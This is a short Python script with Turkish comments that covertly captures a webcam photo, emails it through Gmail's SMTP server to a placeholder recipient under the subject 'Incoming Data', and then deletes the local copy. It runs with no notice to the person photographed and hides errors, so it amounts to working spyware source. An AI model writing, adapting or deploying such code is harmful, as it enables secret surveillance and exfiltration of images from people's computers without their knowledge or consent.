import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
import os
import sys
import time  # gerekli modülleri içe aktardık

def func():
    photo = cv2.VideoCapture(0) # burada bilgisayarın kamerasını kullanacağımız haber verdik 
    time.sleep(1) # bir saniye bekledik aksi halde fotoğraf karanlık çıkar
    rt,image = photo.read() # ardından aldığımız görseli okuduk
    cv2.imwrite("photo.jpg",image) # daha sonra aldığımız görseli photo adıyla kaydetttik
    photo.release() # kamerayı serbest bıraktık
    cv2.destroyAllWindows()
    photo_path = open(os.getcwd()+r"\photo.jpg",'rb').read()

    message = MIMEMultipart()
    message["From"] = "Gönderen Mail"
    message["To"] = "Alıcı Mail"
    message["Subject"] = "Gelen Veriler"


    message_govde =MIMEImage(photo_path)
    message.attach(message_govde)

    try:
        mail = smtplib.SMTP("smtp.gmail.com",587)
        mail.ehlo()
        mail.starttls()
        mail.login("mail adresiniz","mailinizin şifresi")
        mail.sendmail(message["From"],message["To"],message.as_string())
        mail.close()
    except:
        sys.stderr.write("hata")
        sys.stderr.flush()
    time.sleep(5)
    os.system("del photo.jpg") #5 saniye bekledikten sonta fotoğraf silinir


func()
